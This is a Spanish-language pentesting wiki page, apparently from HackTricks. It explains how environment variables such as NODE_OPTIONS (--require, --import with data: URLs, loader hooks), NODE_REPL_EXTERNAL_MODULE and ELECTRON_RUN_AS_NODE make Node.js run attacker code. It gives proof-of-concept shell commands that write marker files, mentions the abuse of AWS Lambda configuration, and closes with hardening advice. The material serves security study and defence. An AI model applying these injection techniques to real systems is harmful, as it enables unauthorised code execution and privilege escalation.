# Injection de aplicaciones Node.js

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Si un atacante puede controlar el entorno de un proceso que termina ejecutando **Node.js** (el binario `node` directamente o cualquier CLI basada en Node, como `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next`, …), varias variables de entorno hacen que el runtime **cargue y ejecute JavaScript controlado por el atacante antes de que se ejecute el programa objetivo**. Esta es una primitiva de ejecución de código equivalente a las familias `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` de otros runtimes.

El código precargado se ejecuta **en el mismo proceso**, con el mismo uid, entorno, descriptores de archivo y entitlements que la víctima, por lo que constituye un vector limpio de injection/priv-esc siempre que un proceso con más privilegios inicie Node con un entorno heredado o influido por el atacante.

## `NODE_OPTIONS` — `--require` (respaldado por un archivo)

`NODE_OPTIONS` se analiza como si su contenido fueran flags adicionales de la línea de comandos. `--require` (`-r`) precarga un módulo CommonJS **antes del punto de entrada**, por lo que su código de nivel superior se ejecuta primero.<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `--import` con una URL `data:` (sin archivo)

Desde **Node 20.6**, `--import` acepta una URL `data:text/javascript,<code>`, lo que permite precargar JavaScript de módulo ES **en línea, sin ningún archivo en el disco ni directorio de módulos**. El código debe estar **completamente codificado en URL** (un espacio o `#` sin procesar trunca la data URL y produce un `SyntaxError`).<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
Esta es la técnica abusada en la cloud, por ejemplo, inyectando `NODE_OPTIONS` en la configuración de una función de AWS Lambda (`lambda:UpdateFunctionConfiguration`, no se requiere `iam:PassRole`) para ejecutar código con el rol de ejecución.

> [!TIP]
> `NODE_OPTIONS` **no puede ejecutar código directamente**: flags como `--eval`/`-e`, `-p` o una ruta de script se rechazan explícitamente (`node: --eval is not allowed in NODE_OPTIONS`). Usa `--require`/`--import` para apuntar al código.

## `NODE_OPTIONS` — loaders personalizados / otros flags de inicio

`NODE_OPTIONS` también admite otros flags que afectan al inicio y cuyo efecto secundario es ejecutar código del atacante, por ejemplo, un hook de loader ESM:
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Cualquier launcher basado en Node que genere un proceso hijo `node` normalmente **propaga `NODE_OPTIONS`**, por lo que inyectarlo una vez puede afectar a toda una toolchain (`npm run …`, `npx`, build tools, test runners, language servers).

## `NODE_REPL_EXTERNAL_MODULE`

Cuando Node inicia un **REPL interactivo**, carga el módulo indicado por `NODE_REPL_EXTERNAL_MODULE` y ejecuta su código de nivel superior. Esto resulta útil cuando la víctima inicia un shell interactivo de `node`/`node -i` (dev tooling, consolas de mantenimiento).<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE` se **ignora** intencionadamente cuando se usa la protección [`kDisableNodeOptionsEnv`](https://nodejs.org/api/cli.html) para iniciar un proceso hijo, pero un REPL interactivo iniciado directamente sí lo tiene en cuenta.

## Electron (`ELECTRON_RUN_AS_NODE`)

Las aplicaciones Electron vuelven a exponer el runtime completo de Node cuando se inician con **`ELECTRON_RUN_AS_NODE=1`**, momento en el que todos los vectores de `NODE_OPTIONS` anteriores se aplican al binario de Electron (a menudo firmado/con permisos). Consulta:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Otros runtimes de JS

- **Bun** lee `NODE_OPTIONS` por compatibilidad y admite su propio `--preload` (configurable mediante `bunfig.toml`).
- **Deno** no tiene en cuenta `NODE_OPTIONS`; en su lugar, requiere flags explícitos (`--import`, `--preload`), por lo que no es vulnerable a un `NODE_OPTIONS` heredado.

Confirma siempre el runtime y la versión exactos, ya que los flags aceptados cambian entre versiones.

## Endurecimiento

- Elimina `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE` y `ELECTRON_RUN_AS_NODE` del entorno antes de iniciar Node desde un contexto con más privilegios; inicia los procesos hijos con un entorno sanitizado.
- Trata la capacidad de establecer el entorno de un objetivo (inyección de configuración, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, variables de CI, configuración de Lambda/container) como equivalente a la ejecución de código en cualquier proceso de Node que inicie.
- Monitoriza la ejecución de procesos para detectar estas variables del mismo modo que [Shield](https://github.com/theevilbit/Shield) genera alertas sobre `ELECTRON_RUN_AS_NODE` y las variables de inyección de dyld.

## References

- [1] [Documentación de Node.js CLI — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` y URLs `data:`](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
